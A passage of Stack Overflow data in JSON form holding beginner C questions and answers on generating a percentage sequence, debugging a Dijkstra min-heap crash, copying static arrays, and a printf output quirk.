16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518651963, "post_id": 48797172, "comment_id": 84598702, "body": "@EugeneSh. I suspect OP&#39;s &quot;only loops and operators&quot; is one on those limitations barring <code>pow()</code>.  Yet not to hard to code around."}, {"owner": {"reputation": 11, "user_id": 9362315, "user_type": "registered", "profile_image": "https://graph.facebook.com/10160111098240464/picture?type=large", "display_name": "w3stw0od", "link": "https://stackoverflow.com/users/9362315/w3stw0od"}, "edited": false, "score": 0, "creation_date": 1518660446, "post_id": 48797172, "comment_id": 84600846, "body": "Sorry for the confusion, I just wanted to give a little context on why I needed those numbers. Thank you both for your help!"}], "answers": [{"tags": [], "owner": {"reputation": 33645, "user_id": 2630032, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/hQF09.jpg?s=128&g=1", "display_name": "Stephan Lechner", "link": "https://stackoverflow.com/users/2630032/stephan-lechner"}, "is_accepted": false, "score": 1, "last_activity_date": 1518647908, "creation_date": 1518647908, "answer_id": 48797380, "question_id": 48797172, "link": "https://stackoverflow.com/questions/48797172/calculate-a-sequence-of-percentages-using-while-loop-in-c/48797380#48797380", "title": "Calculate a sequence of percentages using while loop in C", "body": "<p>A way to solve this is to write a loop that does <code>current += 30</code> three times, then <code>current += 3</code>, again three times, then <code>current += 0.3</code>, and so on.\nThe code could look as follows:</p>\n\n<pre><code>int main() {\n\n    double current=0;\n    double toAdd=30;\n    for (int i=0;i&lt;5;i++) {\n        for(int j=0; j&lt;3; j++) {\n            current+=toAdd;\n            printf(\"%lf\\n\",current);\n        }\n        toAdd /= 10;\n    }\n}\n</code></pre>\n\n<p>Hope it helps.</p>\n"}, {"comments": [{"owner": {"reputation": 11, "user_id": 9362315, "user_type": "registered", "profile_image": "https://graph.facebook.com/10160111098240464/picture?type=large", "display_name": "w3stw0od", "link": "https://stackoverflow.com/users/9362315/w3stw0od"}, "edited": false, "score": 0, "creation_date": 1518660132, "post_id": 48797881, "comment_id": 84600779, "body": "I really didn&#39;t think of doing anything like that thanks a lot!"}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 2, "last_activity_date": 1518661172, "last_edit_date": 1518661172, "creation_date": 1518650750, "answer_id": 48797881, "question_id": 48797172, "link": "https://stackoverflow.com/questions/48797172/calculate-a-sequence-of-percentages-using-while-loop-in-c/48797881#48797881", "title": "Calculate a sequence of percentages using while loop in C", "body": "<blockquote>\n  <p>The percentages are 30, 60, 90, 93, 96, 99, 99.3, 99.6, 99.9, 99.93, etc. all the way to 99.999%</p>\n</blockquote>\n\n<p>Use the difference from 1.0: .7, ... .07, ... .007, ..., a geometric progression.  </p>\n\n<p>Each <code>(1.0 - dif/power10) * 100.0</code> calculation does not depend on prior FP calculations that may introduce accumulated round-off error.<sup>1</sup> </p>\n\n<pre><code>int main(void) {\n  double power10 = 1.0;\n  for (int power = -1; power &gt;= -5; power--) {\n    power10 *= 10.0;\n    for (int digit = 3; digit &lt;= 9; digit += 3) {\n      int dif = 10 - digit;\n      printf(\"%g%%\\n\", (1.0 - dif/power10) * 100.0);\n    }\n  }\n}\n</code></pre>\n\n<p>Output</p>\n\n<pre><code>30%\n60%\n90%\n93%\n96%\n99%\n99.3%\n99.6%\n99.9%\n99.93%\n99.96%\n99.99%\n99.993%\n99.996%\n99.999%\n</code></pre>\n\n<p><sup>1</sup> <code>power10 *= 10.0;</code> is certainly exact for maybe up to 10<sup>22</sup>.</p>\n\n<hr>\n\n<p>For those who like <a href=\"https://codegolf.stackexchange.com\">Code Golf</a>, a modest attempt that outputs like the above.</p>\n\n<pre><code>int main() {\nfor(int i=0;i&lt;15;i++)printf(\"%g%%\\n\",100-atof((char[]){'7'-i%3*3,'0','e','-','0'+i/3,0}));\n}\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 9362315, "user_type": "registered", "profile_image": "https://graph.facebook.com/10160111098240464/picture?type=large", "display_name": "w3stw0od", "link": "https://stackoverflow.com/users/9362315/w3stw0od"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 50, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1518661172, "creation_date": 1518646769, "last_edit_date": 1518647433, "question_id": 48797172, "link": "https://stackoverflow.com/questions/48797172/calculate-a-sequence-of-percentages-using-while-loop-in-c", "title": "Calculate a sequence of percentages using while loop in C", "body": "<p>I need to calculate formulas for different percentages of the speed of light. The percentages are 30, 60, 90, 93, 96, 99, 99.3, 99.6, 99.9, 99.93, etc. all the way to 99.999%. \nI am trying to find a way to get that sequence using only loops and operators but couldn't come up with anything conclusive. Any help would be greatly appreciated!</p>\n"}, {"tags": ["c", "pointers", "heap", "min", "dijkstra"], "comments": [{"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 1, "creation_date": 1518646045, "post_id": 48797013, "comment_id": 84596532, "body": "Welcome to Stack Overflow, please take the <a href=\"https://stackoverflow.com/tour\">tour</a> and read <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> and specially <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518646768, "post_id": 48797013, "comment_id": 84596822, "body": "VTC as unnecessarily unclear as various typedefs missing and lots of extra code for a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>"}, {"owner": {"reputation": 37256, "user_id": 736308, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/o5EqQ.jpg?s=128&g=1", "display_name": "cdarke", "link": "https://stackoverflow.com/users/736308/cdarke"}, "edited": false, "score": 0, "creation_date": 1518647844, "post_id": 48797013, "comment_id": 84597301, "body": "<code>0xC0000005</code>is a memory access violation on Windows.  Look at things like (for example) <code>strcpy</code> which might be trying to copy too many bytes, or if the string is not null terminated.  Where do you allocate memory to the <code>city</code> string in your struct?  Try compiling under DEBUG and run in Visual Studio, you should get more info."}, {"owner": {"reputation": 5010, "user_id": 3150445, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7bfca2588483eadf6695a120cbcef1f8?s=128&d=identicon&r=PG&f=1", "display_name": "jwdonahue", "link": "https://stackoverflow.com/users/3150445/jwdonahue"}, "edited": false, "score": 1, "creation_date": 1518653359, "post_id": 48797013, "comment_id": 84599086, "body": "Definitely learn to use a debugger."}, {"owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "edited": false, "score": 0, "creation_date": 1518655948, "post_id": 48797013, "comment_id": 84599776, "body": "Declaration of <code>struct MinHeapNode</code> is missing and <code>strcpy()</code> to uninitialized pointer is suspicious. Please provide <a href=\"https://stackoverflow.com/help/mcve\">MCVE</a>."}, {"owner": {"reputation": 11, "user_id": 9334897, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff0f7f41e5dc9fc13458b49e5767faf5?s=128&d=identicon&r=PG&f=1", "display_name": "namarok", "link": "https://stackoverflow.com/users/9334897/namarok"}, "edited": false, "score": 0, "creation_date": 1518700525, "post_id": 48797013, "comment_id": 84619212, "body": "hi guys sorry for not posting the best code but I found the source of the problem, when the function was on its cycle of the while loop the output of removemin() was nothing it didnt have a return if the heap was empty so trying to carry out the function without the node pointing to anything I rewrote the while loop so it breaks if the heap is empty using the IsHeapEmpty() function and it works, again sorry for posting bad code."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1518726467, "post_id": 48797013, "comment_id": 84635231, "body": "when posting code, post code that cleanly compiles.  The posted code is including the following header files: <code>#include &quot;graph.h&quot; #include &quot;MinHeap.h&quot; #include &quot;dynamicarraylist.h&quot; #include &quot;singlelinkedlist.h&quot;</code>  but you have not posted the content of those files, so we cannot reproduce the problem."}], "owner": {"reputation": 11, "user_id": 9334897, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff0f7f41e5dc9fc13458b49e5767faf5?s=128&d=identicon&r=PG&f=1", "display_name": "namarok", "link": "https://stackoverflow.com/users/9334897/namarok"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 236, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1518667294, "creation_date": 1518645880, "last_edit_date": 1518667294, "question_id": 48797013, "link": "https://stackoverflow.com/questions/48797013/error-process-returned-1073741819-0xc0000005-c-something-to-do-with-pointers", "title": "error: Process returned -1073741819 (0xC0000005) C something to do with pointers?", "body": "<p>I'm fairly new to <code>code::blocks</code> and how it works but I'm using it for an assignment at uni, basically, its implementing dijkstra's algorithm using ADTs and adjacency lists, the code works and I get an output but I get the error </p>\n\n<blockquote>\n  <p>Process returned -1073741819 (0xC0000005)</p>\n</blockquote>\n\n<p>code for the minimum heap:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include \"graph.h\"\n#include \"MinHeap.h\"\n#include \"dynamicarraylist.h\"\n#include \"singlelinkedlist.h\"\n\n#define CHAR_MAX 50\n#define INFINITY 9999\n\n///constructor function for the total heap, taking the capacity of the heap\n///as an argument and returning the MinHeap struct\nstruct MinHeap* HeapConstructor(int V)\n{\n    //create and allocate memory for a new heap struct\n    struct MinHeap* minHeap;\n    minHeap = malloc(sizeof(struct MinHeap));\n    //copy over the value of capacity and set numentities to 0\n    minHeap-&gt;numentities = 0;\n\n    //assign memory for the position pointer and for the node pointer\n    minHeap-&gt;Node = malloc(V * sizeof(struct MinHeapNode));\n    return minHeap;\n}\n\nstruct MinHeapNode* HeapNodeConstructor(int distance,char* city)\n{\n    struct MinHeapNode* minHeapNode;\n    minHeapNode = malloc(sizeof(struct MinHeapNode));\n\n    minHeapNode-&gt;distance = distance;\n    strcpy(minHeapNode-&gt;city,city);\n\n    return minHeapNode;\n}\n\nstruct ShortestPath* ShortestPathConstructor()\n{\n    //allocate enough memory for the struct\n    struct ShortestPath* shortestPath;\n    shortestPath = malloc(sizeof(struct ShortestPath));\n\n    //initialize with sensible values\n    shortestPath-&gt;distance = malloc(sizeof(int));\n    shortestPath-&gt;parent = NULL;\n    shortestPath-&gt;size = 0;\n    return shortestPath;\n} \n\n/// function to swap two nodes within a minimum heap, this allows us to sort\n/// the heap, this is based on code found on stack overflow for swapping\n/// two pointers found here: https://stackoverflow.com/questions/8403447/swapping-pointers-in-c-char-int\n/// look at swap5 function of top answer\nvoid NodeSwap(struct MinHeapNode** a, struct MinHeapNode** b)\n{\n    //create a temporary node to copy the value of a across to\n    //using pointers so we dont have to return various structs\n    struct MinHeapNode* temp;\n    temp = *a;\n    *a = *b;\n    *b = temp;\n}\n\n///function to heapify a min Heap and update position of all nodes within heap\n///this is required for updating distances from vertex when carrying out dijkstra's algorithm\n/// code for parts of the heapify function is based on psuedo code from the wikipedia article about\n/// binary heaps found at: https://en.wikipedia.org/wiki/Binary_heap\nvoid minHeapify(struct MinHeap* minHeap, int index)\n{\n     int smallest, left, right;\n     smallest = index;\n     left = (index * 2);\n     right = (index * 2) + 1;\n\n     //if we arent at the end of the heap and the left node is smaller than the node above it\n     if(left &lt;= minHeap-&gt;numentities &amp;&amp; minHeap-&gt;Node[left]-&gt;distance &lt; minHeap-&gt;Node[smallest]-&gt;distance)\n     {\n         //smallest becomes the left child node of the heap\n         smallest = left;\n     }\n     // exact same procedure but they must be 2 separate if statements so     that the function compares both both numbers\n     // in all cases\n     if(right &lt;= minHeap-&gt;numentities &amp;&amp; minHeap-&gt;Node[right]-&gt;distance &lt; minHeap-&gt;Node[smallest]-&gt;distance)\n     {\n         smallest = right;\n     }\n\n     //if the smallest node is different from before starting the function then the heap is not yet heapified\n     if(smallest != index)\n     {\n         //swap nodes\n         NodeSwap(&amp;minHeap-&gt;Node[smallest],&amp;minHeap-&gt;Node[index]);\n\n         //recursive function so minHeapify is carried out within the function\n         minHeapify(minHeap,smallest);\n    }\n}\n\n/// simple function to check whether the heap is empty or not\n/// so the function performing dijkstra's algorithm knows when to finish\n/// takes the minHeap as parameters returning 0 if heap is empty and 1 if     it isn't\nint HeapIsEmpty(struct MinHeap* minHeap)\n{\n    if(minHeap-&gt;numentities == 0)\n    {\n         return 0;\n    }\n    return 1;\n}\n\n///Builds our minimum heap using the graph and assigns the distances as infinite or\n///0 for the source node then it heapifies until heap property is achieved\nstruct ShortestPath* BuildMinHeap(struct MinHeap* minHeap, struct List* graph, char* srccity,int V)\n{\n    struct ShortestPath* shortestpath = ShortestPathConstructor();\n    int i;\n    //for total size of the minHeap\n    for(i = 0; i &lt;= V; i++)\n    {\n        //if the source city and the city we're currently at are 0\n        //distance from source is 0\n        if(strcmp(srccity,graph-&gt;vertices[i].cityname) == 0)\n        {\n            minHeap-&gt;Node[minHeap-&gt;numentities + 1] = HeapNodeConstructor(0,srccity);\n            shortestpath[shortestpath-&gt;size + 1].distance = 0;\n            strcpy(shortestpath[shortestpath-&gt;size + 1].city,srccity);\n\n        }\n        //otherwise the distance is infinite\n        else\n        {\n            minHeap-&gt;Node[minHeap-&gt;numentities + 1] = HeapNodeConstructor(INFINITY,graph-&gt;vertices[i].cityname);\n            shortestpath[shortestpath-&gt;size + 1].distance = INFINITY;\n            strcpy(shortestpath[shortestpath-&gt;size + 1].city,graph-&gt;vertices[i].cityname);\n        }\n        shortestpath-&gt;size++;\n        minHeap-&gt;numentities++;\n    }\n\n    //moves through the heap making sure heap property is satisfied\n    for(i = minHeap-&gt;numentities / 2; i &gt; 0; i--)\n    {\n        minHeapify(minHeap,i);\n    }\n    return shortestpath;\n}\n\n\n\n///takes out and returns the minimum node from a heap given as an input\nstruct MinHeapNode* removeMin(struct MinHeap* minHeap)\n{\n    if(minHeap-&gt;numentities != 0)\n    {\n        //remove the root node of the minimum heap and store it\n        struct MinHeapNode* root = minHeap-&gt;Node[1];\n        //move the last element of the heap to the top\n        minHeap-&gt;Node[1] = minHeap-&gt;Node[(minHeap-&gt;numentities) - 1];\n        minHeap-&gt;numentities--;\n        minHeapify(minHeap,1);\n        return root;\n    }\n    else\n    {\n        printf(\"\\nheap is empty \\n\");\n    }\n\n}\n\n///search through the heap for given city name returning the index\n///utilises a linear search algorithm\nint HeapSearch(struct MinHeap* minHeap,char* cityname)\n{\n    int i;\n\n    for(i = 1; i &lt;= minHeap-&gt;numentities; i++)\n    {\n        if(strcmp(minHeap-&gt;Node[i]-&gt;city,cityname) == 0)\n        {\n            return i;\n        }\n    }\n    return -1;\n}\n\n/// decreases key(value) stored within the node from what we defined infinity as being to the shortest currently available path from our source node\n/// to the current node\nvoid DecreaseKey(struct MinHeap* minHeap,int x,int newdistance)\n{\n    //find a return the index of our required city to decrease the key of\n    int i = x;\n\n    //compares new distance with currently stored distance and if bigger than the other function stops\n    if(newdistance &gt; minHeap-&gt;Node[i]-&gt;distance)\n    {\n        return;\n    }\n    else\n    {\n        //move to index node and update value of distance with distance\n        minHeap-&gt;Node[i]-&gt;distance = newdistance;\n    }\n\n    //travel up tree until it is heapified by comparing the index node with its parent node\n    while(minHeap-&gt;Node[i]-&gt;distance &lt; minHeap-&gt;Node[i/2]-&gt;distance &amp;&amp; i &gt; 1)\n    {\n        //swap node with parent node\n        NodeSwap(&amp;minHeap-&gt;Node[i],&amp;minHeap-&gt;Node[i/2]);\n        //move to parent node\n        i = i/2;\n    }\n}\n\nvoid levelorderTraversal(struct MinHeap* minHeap)\n{\n    int i ;\n    for(i = 1; i &lt; minHeap-&gt;numentities; i++)\n    {\n        printf(\"\\n %s %d \",minHeap-&gt;Node[i]-&gt;city, minHeap-&gt;Node[i]-&gt;distance);\n    }\n}\n\nvoid shortestPathDisplay(struct ShortestPath* shortestPath)\n{\n     int i;\n     printf(\"City    Distance From Source\");\n     for(i = 1; i &lt; shortestPath-&gt;size;i++)\n     {\n         printf(\"\\n%s \\t\\t %d\",shortestPath[i].city,shortestPath[i].distance);\n     }\n}\n\n///search the array list and return index of that search or a -1 if failure\n///very important function used in AddEdge function, takes a List struct and a cityname\n///as arguments\nint ShortestPathSearch(struct ShortestPath* shortestPath, char* cityname)\n{\n    int i;\n\n    //seaches from beginning to end of arraylist\n    for(i = 1 ; i &lt;= shortestPath-&gt;size; i++)\n    {\n        //strcmp() function compares two input strings, if they are the same it returns a 0\n        if(strcmp(shortestPath[i].city,cityname) == 0)\n        {\n            // we want the index this vertex was found at\n            return i;\n        }\n    }\n    //if failure return -1\n    return -1;\n}\n\nvoid dijkstra(struct List* graph,char* startcity)\n{\n    //two intermediate integer variables to find distance at various vertices to get minimum weight overall\n    int V = graph-&gt;numcities;\n    int added_distance;\n    struct MinHeap* minHeap = HeapConstructor(V);\n    struct ShortestPath* shortestPath = ShortestPathConstructor();\n\n\n    //builds our minimum heap and heapifies it\n    shortestPath = BuildMinHeap(minHeap,graph,startcity,V);\n    ///shortestPathDisplay(shortestPath,V);\n    ///levelorderTraversal(minHeap);\n\n\n\n    while(minHeap-&gt;Node != NULL)\n    {\n        levelorderTraversal(minHeap);\n        //extract shortest distance in heap\n        struct MinHeapNode* shortestNode = removeMin(minHeap);\n\n\n        printf(\"removed node is %s distance %d \\n\",shortestNode-&gt;city,shortestNode-&gt;distance);\n\n        //searches for removed city within index and adds the current distance associated with this\n        //city\n        int z = ShortestPathSearch(shortestPath,shortestNode-&gt;city);\n        added_distance = shortestPath[z].distance;\n        printf(\"current dist from source: %d \\n\",added_distance);\n\n        //searches for the index of the removed city within our adjacency list and stores it\n        int u = ArrayListSearch(graph,shortestNode-&gt;city);\n        //assigns a new struct of linkedNode type for traversing through adjacenct nodes\n        struct linkedNode* adjListTraverse = graph-&gt;vertices[u].linkedList-&gt;head;\n        //while not at end of list\n        while(adjListTraverse != NULL)\n        {\n            printf(\"city: %s distance: %d \\n\",adjListTraverse-&gt;cityname,adjListTraverse-&gt;weight);\n            //looks for the new adjacenct city within the heap and our output array\n            int v = ShortestPathSearch(shortestPath,adjListTraverse-&gt;cityname);\n            printf(\"v = %d \\n\",v);\n\n            int x = HeapSearch(minHeap,adjListTraverse-&gt;cityname);\n            printf(\"x = %d \\n\",x);\n\n            //if it is in the array and the minHeap and the final distance is not finalised\n            //if x = -1 city is not in heap anymore and can be skipped entirely\n\n            if(adjListTraverse-&gt;weight + added_distance &lt; shortestPath[v].distance)\n            {\n                shortestPath[v].distance = adjListTraverse-&gt;weight + added_distance;\n\n                //update with new distances\n                DecreaseKey(minHeap,x,shortestPath[v].distance);\n            }\n            adjListTraverse = adjListTraverse-&gt;next;\n\n        }\n        shortestPathDisplay(shortestPath);\n        printf(\"\\n\");\n    }\n}\n</code></pre>\n\n<p>Sorry the code is horrendously long I've been trying to find the cause of the problem, I think it might be to do with a pointer not having memory allocated to it but I cant find any pointer like that</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 10498, "user_id": 669576, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/mRhrB.jpg?s=128&g=1", "display_name": "Johnny Mopp", "link": "https://stackoverflow.com/users/669576/johnny-mopp"}, "edited": false, "score": 2, "creation_date": 1518645554, "post_id": 48796930, "comment_id": 84596316, "body": "Either make <code>int *myArr;</code> or use <a href=\"http://en.cppreference.com/w/c/string/byte/memcpy\" rel=\"nofollow noreferrer\"><code>memcpy()</code></a>."}, {"owner": {"reputation": 1646, "user_id": 7501501, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/24ed8d70ce334750ebb5f7e387d402b5?s=128&d=identicon&r=PG&f=1", "display_name": "Yonlif", "link": "https://stackoverflow.com/users/7501501/yonlif"}, "edited": false, "score": 1, "creation_date": 1518645555, "post_id": 48796930, "comment_id": 84596317, "body": "You don&#39;t return anything, that might be a problem as well"}, {"owner": {"reputation": 229185, "user_id": 251311, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/b6b0ca5d4ef200ec8e3cd1fa2aefd836?s=128&d=identicon&r=PG", "display_name": "zerkms", "link": "https://stackoverflow.com/users/251311/zerkms"}, "edited": false, "score": 0, "creation_date": 1518645707, "post_id": 48796930, "comment_id": 84596384, "body": "relevant: <a href=\"https://stackoverflow.com/a/45683469/251311\">stackoverflow.com/a/45683469/251311</a>"}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1518647286, "post_id": 48796930, "comment_id": 84597057, "body": "You can&#39;t assign arrays - it&#39;s one of those stupid rules C has."}, {"owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 0, "creation_date": 1518653969, "post_id": 48796930, "comment_id": 84599244, "body": "Naked arrays in C are not copyable. Keyword <code>static</code> has nothing to do with the issue. You can use a <code>struct</code> trick as a workaround."}], "answers": [{"comments": [{"owner": {"reputation": 37, "user_id": 7891819, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-KwSqqgjLu7U/AAAAAAAAAAI/AAAAAAAAFS8/bXV18jD4eKE/photo.jpg?sz=128", "display_name": "Jacob Hempel", "link": "https://stackoverflow.com/users/7891819/jacob-hempel"}, "edited": false, "score": 0, "creation_date": 1518706033, "post_id": 48796978, "comment_id": 84623127, "body": "I actually used the pointer solution the first time around, but got a segfault due to another issue. I&#39;ll accept your answer because it would have fixed my problem, if my problem was what I thought it was."}], "tags": [], "owner": {"reputation": 10901, "user_id": 578749, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/40231a11da5f1c627fd21d6700edddff?s=128&d=identicon&r=PG", "display_name": "lvella", "link": "https://stackoverflow.com/users/578749/lvella"}, "is_accepted": true, "score": 1, "last_activity_date": 1518645683, "creation_date": 1518645683, "answer_id": 48796978, "question_id": 48796930, "link": "https://stackoverflow.com/questions/48796930/assign-local-arrays-contents-to-global-static-arrays-contents/48796978#48796978", "title": "Assign local array&#39;s contents to global static array&#39;s contents?", "body": "<p>One way to do it is:</p>\n\n<pre><code>static int arr1[] = {1,2,3,4};\nstatic int arr2[] = {4,3,2,1};\n\nint myFunc(int x) {\n    int myArr[4];\n    if (x &gt; 4) {\n        memcpy(myArr, arr1, sizeof arr1);\n    }\n    else if (x &lt;= 4) {\n        memcpy(myArr, arr2, sizeof arr2);\n    }\n}\n</code></pre>\n\n<p>But maybe you just need a pointer to the global array (if you aren't going to modify the copy, perhaps that is your case), so you can just store a pointer:</p>\n\n<pre><code>int myFunc(int x) {\n    const int* myArr;\n    if (x &gt; 4) {\n        myArr = arr1;\n    }\n    else if (x &lt;= 4) {\n        myArr = arr2;\n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 5295, "user_id": 717523, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7b436aae08258d0a6b3f515eb03d5f15?s=128&d=identicon&r=PG", "display_name": "sg7", "link": "https://stackoverflow.com/users/717523/sg7"}, "is_accepted": false, "score": 0, "last_activity_date": 1518653892, "creation_date": 1518653892, "answer_id": 48798325, "question_id": 48796930, "link": "https://stackoverflow.com/questions/48796930/assign-local-arrays-contents-to-global-static-arrays-contents/48798325#48798325", "title": "Assign local array&#39;s contents to global static array&#39;s contents?", "body": "<p>One easy way is to use a pointers to the static global arrays. The name of the array is a pointer. \nThen your function <code>int myFunc(int x)</code> looks almost as your original one.</p>\n\n<p>This is a sample code:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\nstatic int arr1[] = {1,2,3,4,5,6};\nstatic int arr2[] = {4,3,2,1};\n\nint myFunc(int x) {\n    int *myArr;\n    size_t i;\n    size_t myArrSize;\n\n    if (x &gt; 4) {\n\n        myArr = arr1;\n        myArrSize = sizeof(arr1)/sizeof(int);\n    }\n    else if (x &lt;= 4) {\n\n        myArr = arr2;\n        myArrSize = sizeof(arr2)/sizeof(int);        \n    }\n\n    for(i=0; i&lt; myArrSize; i++)\n        printf(\"array[%d]=%d\\n\", i , myArr[i]);\n\n     printf(\"\\n\");\n}\n\nint main() {\n\n   myFunc(6);\n   myFunc(4);\n\n   return 0;\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>array[0]=1\narray[1]=2\narray[2]=3\narray[3]=4\narray[4]=5\narray[5]=6\n\narray[0]=4\narray[1]=3\narray[2]=2\narray[3]=1\n</code></pre>\n\n<p>As you can notice the sizes of <code>arr1</code> and <code>arr2</code> can be different. </p>\n"}], "owner": {"reputation": 37, "user_id": 7891819, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-KwSqqgjLu7U/AAAAAAAAAAI/AAAAAAAAFS8/bXV18jD4eKE/photo.jpg?sz=128", "display_name": "Jacob Hempel", "link": "https://stackoverflow.com/users/7891819/jacob-hempel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 40, "favorite_count": 0, "accepted_answer_id": 48796978, "answer_count": 2, "score": 0, "last_activity_date": 1518653892, "creation_date": 1518645454, "question_id": 48796930, "link": "https://stackoverflow.com/questions/48796930/assign-local-arrays-contents-to-global-static-arrays-contents", "title": "Assign local array&#39;s contents to global static array&#39;s contents?", "body": "<p>I have a couple static global arrays, and I need to conditionally set an array inside my function to be equal to one of them under certain conditions.</p>\n\n<pre><code>static int arr1[] = {1,2,3,4};\nstatic int arr2[] = {4,3,2,1};\n\nint myFunc(int x) {\n    int myArr[4];\n    if (x &gt; 4) {\n        myArr = arr1;\n    }\n    else if (x &lt;= 4) {\n        myArr = arr2;\n    }\n}\n</code></pre>\n\n<p>I'm getting <code>error: incompatible types in assignment</code> and the only thing I can guess is that the static keyword is interfering, because as far as I can tell, both sides of the assignment are int[]. </p>\n\n<p>Thanks in advance!</p>\n"}, {"tags": ["c", "linux", "gcc", "printf"], "comments": [{"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 5, "creation_date": 1518645296, "post_id": 48796875, "comment_id": 84596208, "body": "Is your shell prompt <code>%</code>?"}, {"owner": {"reputation": 33645, "user_id": 2630032, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/hQF09.jpg?s=128&g=1", "display_name": "Stephan Lechner", "link": "https://stackoverflow.com/users/2630032/stephan-lechner"}, "edited": false, "score": 0, "creation_date": 1518645296, "post_id": 48796875, "comment_id": 84596209, "body": "and it&#39;s not the prompt from your shell?"}, {"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 0, "creation_date": 1518645337, "post_id": 48796875, "comment_id": 84596225, "body": "To clarify: I get a different result. <code>Test.~&#47;Documents $</code>. (Blinky thing after the <code>$</code> left out because I cannot enter that in a comment.)"}, {"owner": {"reputation": 29, "user_id": 9362254, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f601f63d7fed7fdb22e459498abda40a?s=128&d=identicon&r=PG&f=1", "display_name": "Philluminati", "link": "https://stackoverflow.com/users/9362254/philluminati"}, "edited": false, "score": 1, "creation_date": 1518645368, "post_id": 48796875, "comment_id": 84596233, "body": "no thats not my shell prompt. If i execute the printf command like that: printf(&quot;Test. \\n&quot;); Than there is no such %"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1518645377, "post_id": 48796875, "comment_id": 84596236, "body": "Screenshot perhaps?"}, {"owner": {"reputation": 25744, "user_id": 2089675, "user_type": "registered", "accept_rate": 80, "profile_image": 